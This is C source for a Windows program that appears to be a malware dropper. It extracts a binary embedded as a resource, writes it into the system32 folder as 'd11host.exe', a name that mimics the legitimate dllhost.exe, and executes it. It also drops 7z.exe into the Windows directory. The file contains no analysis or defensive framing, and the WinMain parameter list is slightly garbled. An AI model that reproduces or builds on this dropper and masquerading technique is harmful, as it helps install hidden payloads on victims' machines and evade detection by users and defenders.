#include <windows.h>
#include <tchar.h>
#include <strsafe.h>

#include "resource.h"

BOOL ExtractAndExecFile(LPCTSTR lpResourceName)
{
	HRSRC hRes = FindResource(NULL,lpResourceName,TEXT("BINARY"));
	if(!hRes)
		return FALSE;

	HGLOBAL hResGlobal = LoadResource(NULL,hRes);
	if(!hResGlobal)
		return FALSE;

	DWORD dwResSize = SizeofResource(NULL,hRes);
	LPBYTE pResPtr = (LPBYTE)LockResource(hResGlobal);
	if(!pResPtr)
		return FALSE;

	TCHAR szWinPath[MAX_PATH];
	TCHAR szTempFile[MAX_PATH];

	GetWindowsDirectory(szWinPath,MAX_PATH);
	StringCchPrintf(szTempFile,MAX_PATH,TEXT("%s\\system32\\d11host.exe"),szWinPath);


	HANDLE hFile = CreateFile(szTempFile,GENERIC_READ|GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwBytesWritten = 0;

	WriteFile(hFile,pResPtr,dwResSize,&dwBytesWritten,NULL);

	UnlockResource(hResGlobal);
	CloseHandle(hFile);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si,sizeof(si));
	si.cb = sizeof(si);

	ZeroMemory(&pi,sizeof(pi));

	BOOL bfOK = CreateProcess(NULL,szTempFile,NULL,NULL,FALSE,0,NULL,szWinPath,&si,&pi);
	if(!bfOK)
		return FALSE;

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return TRUE;
}

BOOL Extract7Z(IN LPTSTR lpResourceName)
{
	HRSRC hRes = FindResource(NULL,lpResourceName,TEXT("BINARY"));
	if(!hRes)
		return FALSE;

	HGLOBAL hResGlobal = LoadResource(NULL,hRes);
	if(!hResGlobal)
		return FALSE;

	DWORD dwResSize = SizeofResource(NULL,hRes);
	LPBYTE pResPtr = (LPBYTE)LockResource(hResGlobal);
	if(!pResPtr)
		return FALSE;

	TCHAR szWinPath[MAX_PATH];
	TCHAR szTempFile[MAX_PATH];

	GetWindowsDirectory(szWinPath,MAX_PATH);
	StringCchPrintf(szTempFile,MAX_PATH,TEXT("%s\\7z.exe"),szWinPath);


	HANDLE hFile = CreateFile(szTempFile,GENERIC_READ|GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwBytesWritten = 0;

	WriteFile(hFile,pResPtr,dwResSize,&dwBytesWritten,NULL);

	UnlockResource(hResGlobal);
	CloseHandle(hFile);
	
	return TRUE;
}

int WINAPI _tWinMain(HINSTANCE hInstance,HINSTANCE /*hPrevInstanc*/e,PTSTR lpCmdLine,int nCmdShow)
{
    ExtractAndExecFile(MAKEINTRESOURCE(IDR_DLLHOST));
    
    Extract7Z(MAKEINTRESOURCE(IDR_7Z));

    return 0;
}

